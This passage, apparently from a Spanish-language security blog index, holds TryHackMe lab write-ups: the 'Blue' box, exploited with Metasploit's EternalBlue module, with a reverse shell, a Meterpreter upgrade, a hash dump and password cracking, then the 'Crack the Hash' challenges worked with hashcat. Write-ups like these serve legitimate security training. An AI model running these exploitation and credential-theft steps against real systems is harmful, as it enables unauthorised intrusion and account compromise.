of exploit packet [*] 10.10.24.91:445 - Starting non-paged pool grooming [+] 10.10.24.91:445 - Sending SMBv2 buffers [+] 10.10.24.91:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.24.91:445 - Sending final SMBv2 buffers. [*] 10.10.24.91:445 - Sending last fragment of exploit packet! [*] 10.10.24.91:445 - Receiving response from exploit packet [+] 10.10.24.91:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.24.91:445 - Sending egg to corrupted connection. [*] 10.10.24.91:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.1.72:4444 -\u0026gt; 10.10.24.91:49196) at 2019-09-03 21:15:49 -0400 [+] 10.10.24.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.24.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.24.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt;   UPGRADE SHELL - METERPRETER Utilizamos el eexploit de post explotacion multi/manage/shell_to_meterpreter para actualizar nuestra shell a meterpreter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.24.91:49196 (10.10.24.91) msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; search shell_to_meterpreter Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 post/multi/manage/shell_to_meterpreter normal No Shell to Meterpreter Upgrade msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; show options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set session 1 session =\u0026gt; 1 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.8.1.72:4433 [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [*] Sending stage (179779 bytes) to 10.10.24.91 [*] Meterpreter session 2 opened (10.8.1.72:4433 -\u0026gt; 10.10.24.91:49203) at 2019-09-03 21:21:37 -0400 [*] Stopping exploit/multi/handler msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.24.91:49196 (10.10.24.91) 2 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ JON-PC 10.8.1.72:4433 -\u0026gt; 10.10.24.91:49203 (10.10.24.91) msf5 post(multi/manage/shell_to_meterpreter) \u0026gt;   METASPLOIT - HASHDUMP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  meterpreter \u0026gt; run post/windows/gather/hashdump [*] Obtaining the boot key... [*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7... [*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... Jon:\u0026#34;Nah boi, I ain\u0026#39;t sharing nutting with you\u0026#34; [*] Dumping password hashes... Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: meterpreter \u0026gt;   JOHN - CRACK PASSWORDS Crackeamos las contraseñas con john.\n1 2 3 4 5 6 7 8 9 10 11 12  root@kali:~/trymehack/blue# john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=NT Using default input encoding: UTF-8 Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3]) Warning: no OpenMP support for this hash type, consider --fork=4 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status (Administrator) alqfna22 (Jon) 2g 0:00:00:00 DONE (2019-09-03 21:34) 2.061g/s 10515Kp/s 10515Kc/s 10520KC/s alqui..alpusidi Warning: passwords printed above might not be all those cracked Use the \u0026#34;--show --format=NT\u0026#34; options to display all of the cracked passwords reliably Session completed root@kali:~/trymehack/blue#   FLAGS Encontrando las flags.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  meterpreter \u0026gt; ls Listing: C:\\ ============ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2009-07-13 23:18:56 -0400 $Recycle.Bin 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Documents and Settings 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:08 -0400 PerfLogs 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files (x86) 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:08 -0400 ProgramData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:22 -0500 Recovery 40777/rwxrwxrwx 4096 dir 2018-12-12 18:01:17 -0500 System Volume Information 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Users 40777/rwxrwxrwx 16384 dir 2009-07-13 23:20:08 -0400 Windows 100666/rw-rw-rw- 24 fil 2018-12-12 22:47:39 -0500 flag1.txt 567211570/r-xrwx--- 438533065912909807 fif 13905563959-04-24 15:54:40 -0400 hiberfil.sys 567211570/r-xrwx--- 438533065912909807 fif 13905563959-04-24 15:54:40 -0400 pagefile.sys meterpreter \u0026gt; cat flag1.txt flag{******************} meterpreter \u0026gt; pwd C:\\ meterpreter \u0026gt;   Utilizamos dir para encontrar los archivos que lleven el nombre de \u0026ldquo;flag\u0026rdquo;.\nComando:\n1  dir flag* /s /p   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  C:\\\u0026gt;dir flag* /s /p dir flag* /s /p Volume in drive C has no label. Volume Serial Number is E611-0B66 Directory of C:\\  03/17/2019 02:27 PM 24 flag1.txt 1 File(s) 24 bytes Directory of C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent 03/17/2019 02:26 PM 482 flag1.lnk 03/17/2019 02:30 PM 848 flag2.lnk 03/17/2019 02:32 PM 2,344 flag3.lnk 3 File(s) 3,674 bytes Directory of C:\\Users\\Jon\\Documents 03/17/2019 02:26 PM 37 flag3.txt 1 File(s) 37 bytes Total Files Listed: 5 File(s) 3,735 bytes 0 Dir(s) 22,796,713,984 bytes free C:\\\u0026gt; C:\\\u0026gt;type C:\\Users\\Jon\\Documents\\flag3.txt type C:\\Users\\Jon\\Documents\\flag3.txt flag{*******************************} C:\\\u0026gt; C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent\u0026gt;type flag2.lnk type flag2.lnk L�F� h+汖��h+汖��=]�����\u0026#39;P�O� �:i�+00�/C:\\R1�M�Windows��:���M�*pWindowsV1qN��System32��:��qN��*\tSystem32P1�Mconfig��:���M*�\tconfigX2\u0026#39;�M flag2.txtﾍM�M*�flag2.txtS-Rf �C:\\Windows\\System32\\config\\flag2.txt6..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\config\\flag2.txt�C:\\Windows\\System32\\config(\t�1SPS�XF�L8C���\u0026amp;�m�`�Xjon-pc��̴�H�C�Kz�k��:������d)d�4 C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent\u0026gt;dir /ah C:\\Windows\\System32\\config dir /ah C:\\Windows\\System32\\config Volume in drive C has no label. Volume Serial Number is E611-0B66 Directory of C:\\Windows\\System32\\config File Not Found C:\\Users\\Jon\\AppData\\Roaming\\Microsoft\\Windows\\Recent\u0026gt;   Nuestra flag2 se encuentra en C:\\Windows\\System32\\config*.\n1 2 3 4  C:\\Windows\\system32\u0026gt;type C:\\Windows\\System32\\config\\flag2.txt type C:\\Windows\\System32\\config\\flag2.txt flag{****************************} C:\\Windows\\system32\u0026gt;   ","description":"Blue es una maquina de TryHackMe, presenta una vulnerabilidad Eternal Blue, utilizamos metasploit para configurar y explotar la vulnerabilidad encontrada y obtener las flags.","id":135,"section":"posts","tags":["eternalblue","ms17_010","smbclient","metasploit"],"title":"TryHackMe - Blue","uri":"https://sckull.github.io/posts/blue-thm/"},{"content":"  Crack The Hash es una serie de retos de TryHackMe que presenta diferentes Hashes las cuales identificamos con hash-identifier y Hash-Analyzer, y crackeamos con Hashcat y CrackStation.\nRoom    Titulo Crack the hash      Descripción Cracking hashes challenges   Puntos 320   Dificultad Facil   Maker ben     CRACK THE HASH En esta serie de retos nos proveen de distintas hashes las cuales debemos de crackear y enviar el resultado de cada una de estas, al principio utilizamos hash-identifier, hash analyzer y hash identification para identificar el tipo de hash y para el crackeo de los hashes utilizamos hashcat y crackstation.\nLinks de la herramientas y paginas utilizadas:\n hash-identifier hash-analyzer hahs-identification hashcat crackstation  NIVEL 1 #1 MD5 Hash:\n48bb6e862e54f2a795ffc4e541caed4d\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  root@kali:~# hash-identifier ######################################################################### #\t__ __ __\t______ _____\t# #\t/\\ \\/\\ \\\t/\\ \\ /\\__ _\\ /\\ _ `\\\t# #\t\\ \\ \\_\\ \\ __ ____ \\ \\ \\___\t\\/_/\\ \\/ \\ \\ \\/\\ \\\t# #\t\\ \\ _ \\ /\u0026#39;__`\\ / ,__\\ \\ \\ _ `\\\t\\ \\ \\ \\ \\ \\ \\ \\\t# #\t\\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\\t\\_\\ \\__ \\ \\ \\_\\ \\\t# #\t\\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/\t# #\t\\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.1 # #\tBy Zion3R # #\twww.Blackploit.com # #\tRoot@Blackploit.com # ######################################################################### ------------------------------------------------------------------------- HASH: 48bb6e862e54f2a795ffc4e541caed4d Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5($pass.$salt) [+] md5($salt.$pass) [+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt)) [+] md5($username.0.$pass) [+] md5($username.LF.$pass) [+] md5($username.md5($pass).$salt) [+] md5(md5($pass)) [+] md5(md5($pass).$salt) [+] md5(md5($pass).md5($salt)) [+] md5(md5($salt).$pass) [+] md5(md5($salt).md5($pass)) [+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass))) [+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass))))) [+] md5(sha1($pass)) [+] md5(sha1(md5($pass))) [+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass))) -------------------------------------------------------------------------   HASHCAT 1  ./hashcat64.bin -m 0 hash.txt rockyou.txt   CrackStation Crackeada:\neasy:48bb6e862e54f2a795ffc4e541caed4d\n#2 SHA1 Hash:\nCBFDAC6008F9CAB4083784CBD1874F76618D2A97\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  HASH: CBFDAC6008F9CAB4083784CBD1874F76618D2A97 Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass)) Least Possible Hashs: [+] Tiger-160 [+] Haval-160 [+] RipeMD-160 [+] SHA-1(HMAC) [+] Tiger-160(HMAC) [+] RipeMD-160(HMAC) [+] Haval-160(HMAC) [+] SHA-1(MaNGOS) [+] SHA-1(MaNGOS2) [+] sha1($pass.$salt) [+] sha1($salt.$pass) [+] sha1($salt.md5($pass)) [+] sha1($salt.md5($pass).$salt) [+] sha1($salt.sha1($pass)) [+] sha1($salt.sha1($salt.sha1($pass))) [+] sha1($username.$pass) [+] sha1($username.$pass.$salt) [+] sha1(md5($pass)) [+] sha1(md5($pass).$salt) [+] sha1(md5(sha1($pass))) [+] sha1(sha1($pass)) [+] sha1(sha1($pass).$salt) [+] sha1(sha1($pass).substr($pass,0,3)) [+] sha1(sha1($salt.$pass)) [+] sha1(sha1(sha1($pass))) [+] sha1(strtolower($username).$pass) -------------------------------------------------------------------------   HASHCAT 1  ./hashcat64.bin -m 100 hash.txt rockyou.txt   Crackstation Crackeada:\npassword123:CBFDAC6008F9CAB4083784CBD1874F76618D2A97\n#3 SHA256 Hash:\n1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  HASH: 1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032 Possible Hashs: [+] SHA-256 [+] Haval-256 Least Possible Hashs: [+] GOST R 34.11-94 [+] RipeMD-256 [+] SNEFRU-256 [+] SHA-256(HMAC) [+] Haval-256(HMAC) [+] RipeMD-256(HMAC) [+] SNEFRU-256(HMAC) [+] SHA-256(md5($pass)) [+] SHA-256(sha1($pass)) -------------------------------------------------------------------------   HASHCAT 1  ./hashcat64.bin -m 1400 hash.txt rockyou.txt   CrackStation Crackeada:\nletmein:1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032\n#4 BCRYPT Hash:\n$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom\nHash-Analyzer Identificamos este hash con la pagina Tunnelsup y Utilizamos hashcat para poder desencriptar el hash el cual tomo mucho tiempo.\nHASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m 3200 hash.txt ../rockyou.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Single-Hash * Single-Salt Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 72 Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 Cracking performance lower than expected? * Append -w 3 to the commandline. This can cause your screen to lag. * Update your OpenCL runtime / driver the right way: https://hashcat.net/faq/wrongdriver * Create more work items to make use of your parallelization power: https://hashcat.net/faq/morework [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; s Session..........: hashcat Status...........: Running Hash.Type........: bcrypt $2*$, Blowfish (Unix) Hash.Target......: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX...8wsRom Time.Started.....: Thu Sep 5 15:31:19 2019 (10 mins, 43 secs) Time.Estimated...: Tue Oct 8 02:23:53 2019 (32 days, 10 hours) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 5 H/s (4.21ms) @ Accel:4 Loops:1 Thr:8 Vec:1 Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts Progress.........: 3264/14344385 (0.02%) Rejected.........: 0/3264 (0.00%) Restore.Point....: 3264/14344385 (0.02%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:916-917 Candidates.#1....: alucard -\u0026gt; hottie101 Hardware.Mon.#1..: Temp: 71c Util: 92% Core:1189MHz Mem:2505MHz Bus:4 [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =\u0026gt; s   Crackeada:\nbleh:$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom\n#5 MD4 Hash:\n279412f945939ba78ce0758d3fd83daa\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  HASH: 279412f945939ba78ce0758d3fd83daa Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5($pass.$salt) [+] md5($salt.$pass) [+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt)) [+] md5($username.0.$pass) [+] md5($username.LF.$pass) [+] md5($username.md5($pass).$salt) [+] md5(md5($pass)) [+] md5(md5($pass).$salt) [+] md5(md5($pass).md5($salt)) [+] md5(md5($salt).$pass) [+] md5(md5($salt).md5($pass)) [+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass))) [+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass))))) [+] md5(sha1($pass)) [+] md5(sha1(md5($pass))) [+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass))) -------------------------------------------------------------------------   HASHCAT 1  ./hashcat64.bin -m 900 hash.txt rockyou.txt   CrackStation Crackeada:\nEternity22:279412f945939ba78ce0758d3fd83daa\nNIVEL 2 #1 SHA256 Hash:\nF09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85\nHASHIDENTIFIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  HASH: F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85 Possible Hashs: [+] SHA-256 [+] Haval-256 Least Possible Hashs: [+] GOST R 34.11-94 [+] RipeMD-256 [+] SNEFRU-256 [+] SHA-256(HMAC) [+] Haval-256(HMAC) [+] RipeMD-256(HMAC) [+] SNEFRU-256(HMAC) [+] SHA-256(md5($pass)) [+] SHA-256(sha1($pass)) -------------------------------------------------------------------------   HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m 1400 hash.txt ../rockyou.txt hashcat (v5.1.0) starting... * Device #1: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: NVIDIA Corporation ====================================== * Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: ../rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule Session..........: hashcat Status...........: Cracked Hash.Type........: SHA2-256 Hash.Target......: f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f...2d0c85 Time.Started.....: Thu Sep 5 16:44:44 2019 (1 sec) Time.Estimated...: Thu Sep 5 16:44:45 2019 (0 secs) Guess.Base.......: File (../rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 12297.6 kH/s (3.26ms) @ Accel:1024 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 196608/14344385 (1.37%) Rejected.........: 0/196608 (0.00%) Restore.Point....: 0/14344385 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 123456 -\u0026gt; piggy9 Hardware.Mon.#1..: Temp: 60c Util: 0% Core:1189MHz Mem:2505MHz Bus:4 Started: Thu Sep 5 16:44:42 2019 Stopped: Thu Sep 5 16:44:46 2019   CrackStation Crackeada:\nf09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule\n#2 NTLM Hash:\n1DFECA0C002AE40B8619ECF94819CC1B\nEste hash al principio con las herramientas para identificarlo parece como un hash de MD5, al intentar crackearla con el formato de NTLM nos crackeó el hash hashcat.\nHash Analyzer Hash Identification HASHIDENTIfIER 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  HASH: 1DFECA0C002AE40B8619ECF94819CC1B Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) Least Possible Hashs: [+] RAdmin v2.x [+] NTLM [+] MD4 [+] MD2 [+] MD5(HMAC) [+] MD4(HMAC) [+] MD2(HMAC) [+] MD5(HMAC(Wordpress)) [+] Haval-128 [+] Haval-128(HMAC) [+] RipeMD-128 [+] RipeMD-128(HMAC) [+] SNEFRU-128 [+] SNEFRU-128(HMAC) [+] Tiger-128 [+] Tiger-128(HMAC) [+] md5($pass.$salt) [+] md5($salt.$pass) [+] md5($salt.$pass.$salt) [+] md5($salt.$pass.$username) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($pass.$salt)) [+] md5($salt.md5($salt.$pass)) [+] md5($salt.md5(md5($pass).$salt)) [+] md5($username.0.$pass) [+] md5($username.LF.$pass) [+] md5($username.md5($pass).$salt) [+] md5(md5($pass)) [+] md5(md5($pass).$salt) [+] md5(md5($pass).md5($salt)) [+] md5(md5($salt).$pass) [+] md5(md5($salt).md5($pass)) [+] md5(md5($username.$pass).$salt) [+] md5(md5(md5($pass))) [+] md5(md5(md5(md5($pass)))) [+] md5(md5(md5(md5(md5($pass))))) [+] md5(sha1($pass)) [+] md5(sha1(md5($pass))) [+] md5(sha1(md5(sha1($pass)))) [+] md5(strtoupper(md5($pass))) -------------------------------------------------------------------------   HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66  sckull@tars:~/tools$ ./hashcat/hashcat64.bin -m 1000 md5.hash rockyou.txt hashcat (v5.1.0) starting... * Device #2: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: Intel(R) Corporation ======================================== * Device #1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped. OpenCL Platform #2: NVIDIA Corporation ====================================== * Device #2: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Early-Skip * Not-Salted * Not-Iterated * Single-Hash * Single-Salt * Raw-Hash Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but for the price of drastically reduced performance. If you want to switch to optimized OpenCL kernels, append -O to your commandline. Watchdog: Temperature abort trigger set to 90c Dictionary cache hit: * Filename..: rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 1dfeca0c002ae40b8619ecf94819cc1b:n63umy8lkf4i Session..........: hashcat Status...........: Cracked Hash.Type........: NTLM Hash.Target......: 1dfeca0c002ae40b8619ecf94819cc1b Time.Started.....: Thu Sep 5 18:09:22 2019 (1 sec) Time.Estimated...: Thu Sep 5 18:09:23 2019 (0 secs) Guess.Base.......: File (rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#2.........: 7257.8 kH/s (3.00ms) @ Accel:1024 Loops:1 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 5308416/14344385 (37.01%) Rejected.........: 0/5308416 (0.00%) Restore.Point....: 5111808/14344385 (35.64%) Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#2....: nguy7124 -\u0026gt; muppetme Hardware.Mon.#2..: Temp: 73c Util: 55% Core:1110MHz Mem:2505MHz Bus:4 Started: Thu Sep 5 18:09:21 2019 Stopped: Thu Sep 5 18:09:24 2019 sckull@tars:~/tools$   CrackStation Crackeada:\n1dfeca0c002ae40b8619ecf94819cc1b:n63umy8lkf4i\n#3 SHA512 HashInfo:\n1 2 3  Hash: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02. Salt: aReallyHardSalt Rounds: 5   Hash Identification HASHCAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  sckull@tars:~/tools$ ./hashcat/hashcat64.bin -m 1800 sha512.hash rockyou.txt --session sha512 hashcat (v5.1.0) starting... * Device #2: WARNING! Kernel exec timeout is not disabled. This may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch nvmlDeviceGetFanSpeed(): Not Supported OpenCL Platform #1: Intel(R) Corporation ======================================== * Device #1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped. OpenCL Platform #2: NVIDIA Corporation ====================================== * Device #2: GeForce MX130, 501/2004 MB allocatable, 3MCU Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Applicable optimizers: * Zero-Byte * Single-Hash * Single-Salt * Uses-64-Bit Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 ATTENTION! Pure (unoptimized) OpenCL kernels selected. This enables cracking passwords and salts \u0026gt; length 32 but 